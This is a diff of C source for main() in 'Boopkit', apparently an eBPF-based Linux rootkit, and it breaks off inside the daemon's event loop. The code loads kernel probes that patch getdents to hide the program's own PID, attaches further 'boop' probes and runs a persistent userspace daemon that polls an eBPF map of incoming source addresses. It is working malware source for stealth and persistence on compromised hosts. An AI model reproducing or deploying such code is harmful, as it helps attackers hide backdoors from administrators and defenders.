@@ -202,155 +202,143 @@ void rootcheck(int argc, char **argv) {
   }
 }
 
-// main
-//
-// The primary program entry point and argument handling.
-//
-// By design this will only log to stdout to create an
-// easier obfuscating experience!
+/**
+ * main
+ *
+ * Main entrypoint for the program.
+ */
 int main(int argc, char **argv) {
   clisetup(argc, argv);
   asciiheader();
   rootcheck(argc, argv);
   boopprintf("  -> Logs: cat /sys/kernel/tracing/trace_pipe\n");
-  // Return value for eBPF loading
+
   int loaded, err;
-
-  // ===========================================================================
-  // Safe probes
-  //
-  // This will load the safe kernel probes at runtime.
-  //
-  struct pr0be_safe *sfobj;
-  boopprintf("  -> Loading eBPF Probe: %s\n", cfg.pr0besafepath);
-  sfobj = pr0be_safe__open();
-  char pid[MAXPIDLEN];
-  // getpid()
-  //
-  // Note: We know that we can use getpid() as the rootcheck() function above
-  //       will manage ensuring we are executing this program without sudo
-  env.pid_to_hide = getpid();
-  sprintf(pid, "%d", env.pid_to_hide);
-  boopprintf("  -> Obfuscating PID: %s\n", pid);
-  strncpy(sfobj->rodata->pid_to_hide, pid, sizeof(sfobj->rodata->pid_to_hide));
-
-  sfobj->rodata->pid_to_hide_len = strlen(pid) + 1;
-  sfobj->rodata->target_ppid = env.target_ppid;
-  loaded = pr0be_safe__load(sfobj);
-  if (loaded < 0) {
-    boopprintf("Unable to load eBPF object: %s\n", cfg.pr0besafepath);
-    boopprintf("Privileged acces required to load eBPF probe!\n");
-    boopprintf("Permission denied.\n");
-    return 1;
-  }
-  boopprintf("  -> eBPF Probe loaded: %s\n", cfg.pr0besafepath);
-
-  // Exit
-  int index = PROG_01;
-  int prog_fd = bpf_program__fd(sfobj->progs.handle_getdents_exit);
-  int ret = bpf_map_update_elem(bpf_map__fd(sfobj->maps.map_prog_array), &index,
-                                &prog_fd, BPF_ANY);
-  if (ret == -1) {
-    boopprintf("Failed to hide PID: %s\n", strerror(errno));
-    return 1;
-  }
-
-  //  Patch
-  index = PROG_02;
-  prog_fd = bpf_program__fd(sfobj->progs.handle_getdents_patch);
-  ret = bpf_map_update_elem(bpf_map__fd(sfobj->maps.map_prog_array), &index,
-                            &prog_fd, BPF_ANY);
-  if (ret == -1) {
-    boopprintf("Failed to obfuscated PID\n");
-    return 1;
-  }
-
-  // Attach to probe
-  err = pr0be_safe__attach(sfobj);
-  if (err) {
-    boopprintf("Failed to attach %s\n", cfg.pr0besafepath);
-    return 1;
-  }
-
-  // Set up ring buffer
-  struct ring_buffer *rb = NULL;
-  rb = ring_buffer__new(bpf_map__fd(sfobj->maps.rb), handlepidlookup, NULL,
-                        NULL);
-  if (!rb) {
-    boopprintf("Failed to create ring buffer\n");
-    return 1;
-  }
-
-  // ===========================================================================
-  // Boop probes
-  //
-  // This will load the boop kernel probes at runtime.
-  //
   struct bpf_object *bpobj;
-  boopprintf("  -> Loading eBPF Probe: %s\n", cfg.pr0bebooppath);
-  bpobj = bpf_object__open(cfg.pr0bebooppath);
-  if (!bpobj) {
-    boopprintf("Unable to open eBPF object: %s\n", cfg.pr0bebooppath);
-    boopprintf("Privileged acces required to load eBPF probe!\n");
-    boopprintf("Permission denied.\n");
-    return 1;
-  }
-  loaded = bpf_object__load(bpobj);
-  if (loaded < 0) {
-    boopprintf("Unable to load eBPF object: %s\n", cfg.pr0bebooppath);
-    return 1;
-  }
-  boopprintf("  -> eBPF Probe loaded: %s\n", cfg.pr0bebooppath);
   struct bpf_program *program = NULL;
-  bpf_object__for_each_program(program, bpobj) {
-    boopprintf("  -> eBPF Program Address: %p\n", program);
-    const char *progname = bpf_program__name(program);
-    boopprintf("  -> eBPF Program Name: %s\n", progname);
-    const char *progsecname = bpf_program__section_name(program);
-    boopprintf("  -> eBPF Program Section Name: %s\n", progsecname);
-    struct bpf_link *link = bpf_program__attach(program);
-    if (!link) {
-      boopprintf("Unable to link eBPF program: %s\n", progname);
-      continue;
-    }
-  }
-
-  // ===========================================================================
-  // Boop eBPF Map
-  //
-  // We (by design) only have a single map for the boop object!
-  // Therefore, we can call next_map() with NULL and get the first
-  // map from the probe.
   struct bpf_map *bpmap = bpf_object__next_map(bpobj, NULL);
   const char *mapname = bpf_map__name(bpmap);
-  boopprintf("  -> eBPF Map Name: %s\n", mapname);
   int fd = bpf_map__fd(bpmap);
-  boopprintf("  -> eBPF Program Linked!\n");
+  struct ring_buffer *rb = NULL;
 
+  // ===========================================================================
+  // [pr0be.safe.o]
+  {
+    struct pr0be_safe *sfobj;
+    boopprintf("  -> Loading eBPF Probe: %s\n", cfg.pr0besafepath);
+    sfobj = pr0be_safe__open();
+    char pid[MAXPIDLEN];
+    // getpid()
+    //
+    // Note: We know that we can use getpid() as the rootcheck() function above
+    //       will manage ensuring we are executing this program without sudo
+    env.pid_to_hide = getpid();
+    sprintf(pid, "%d", env.pid_to_hide);
+    boopprintf("  -> Obfuscating PID: %s\n", pid);
+    strncpy(sfobj->rodata->pid_to_hide, pid,
+            sizeof(sfobj->rodata->pid_to_hide));
+
+    sfobj->rodata->pid_to_hide_len = strlen(pid) + 1;
+    sfobj->rodata->target_ppid = env.target_ppid;
+    loaded = pr0be_safe__load(sfobj);
+    if (loaded < 0) {
+      boopprintf("Unable to load eBPF object: %s\n", cfg.pr0besafepath);
+      boopprintf("Privileged acces required to load eBPF probe!\n");
+      boopprintf("Permission denied.\n");
+      return 1;
+    }
+    boopprintf("  -> eBPF Probe loaded: %s\n", cfg.pr0besafepath);
+    int index = PROG_01;
+    int prog_fd = bpf_program__fd(sfobj->progs.handle_getdents_exit);
+    int ret = bpf_map_update_elem(bpf_map__fd(sfobj->maps.map_prog_array),
+                                  &index, &prog_fd, BPF_ANY);
+    if (ret == -1) {
+      boopprintf("Failed to hide PID: %s\n", strerror(errno));
+      return 1;
+    }
+    index = PROG_02;
+    prog_fd = bpf_program__fd(sfobj->progs.handle_getdents_patch);
+    ret = bpf_map_update_elem(bpf_map__fd(sfobj->maps.map_prog_array), &index,
+                              &prog_fd, BPF_ANY);
+    if (ret == -1) {
+      boopprintf("Failed to obfuscated PID\n");
+      return 1;
+    }
+    err = pr0be_safe__attach(sfobj);
+    if (err) {
+      boopprintf("Failed to attach %s\n", cfg.pr0besafepath);
+      return 1;
+    }
+    rb = ring_buffer__new(bpf_map__fd(sfobj->maps.rb), handlepidlookup, NULL,
+                          NULL);
+    if (!rb) {
+      boopprintf("Failed to create ring buffer\n");
+      return 1;
+    }
+  }
+  // [pr0be.safe.o]
+  // ===========================================================================
+
+
+
+
+  // ===========================================================================
+  // [pr0be.boop.o]
+  {
+    boopprintf("  -> Loading eBPF Probe: %s\n", cfg.pr0bebooppath);
+    bpobj = bpf_object__open(cfg.pr0bebooppath);
+    if (!bpobj) {
+      boopprintf("Unable to open eBPF object: %s\n", cfg.pr0bebooppath);
+      boopprintf("Privileged acces required to load eBPF probe!\n");
+      boopprintf("Permission denied.\n");
+      return 1;
+    }
+    loaded = bpf_object__load(bpobj);
+    if (loaded < 0) {
+      boopprintf("Unable to load eBPF object: %s\n", cfg.pr0bebooppath);
+      return 1;
+    }
+    boopprintf("  -> eBPF Probe loaded: %s\n", cfg.pr0bebooppath);
+    bpf_object__for_each_program(program, bpobj) {
+      boopprintf("  -> eBPF Program Address: %p\n", program);
+      const char *progname = bpf_program__name(program);
+      boopprintf("  -> eBPF Program Name: %s\n", progname);
+      const char *progsecname = bpf_program__section_name(program);
+      boopprintf("  -> eBPF Program Section Name: %s\n", progsecname);
+      struct bpf_link *link = bpf_program__attach(program);
+      if (!link) {
+        boopprintf("Unable to link eBPF program: %s\n", progname);
+        continue;
+      }
+    }
+    boopprintf("  -> eBPF Map Name: %s\n", mapname);
+  }
+  // [pr0be.boop.o]
+  // ===========================================================================
+
+
+  // Logs
   for (int i = 0; i < cfg.denyc; i++) {
     boopprintf("   X Deny address: %s\n", cfg.deny[i]);
   }
+
 
   // ===========================================================================
   // Boopkit event loop
   //
   // Boopkit will run as a persistent daemon in userspace!
+  //
+  //
   int ignore = 0;
   while (1) {
-    err = ring_buffer__poll(rb, 100);
-    if (err != 0) {
-      // Ignore errors for PID events
-    }
-    // =========================================================================
-    // Boop map management
-    //
+    err = ring_buffer__poll(rb, 100); // Ignore events!
     int ikey = 0, jkey;
     int err;
-
     char saddrval[INET_ADDRSTRLEN];  // Saturn Valley. If you know, you know.
     __u8 saddrbytes[4];
-
     struct event_boop_t ret;
+
+
     while (!bpf_map_get_next_key(fd, &ikey, &jkey)) {
       err = bpf_map_lookup_elem(fd, &jkey, &ret);
       if (err < 0) {
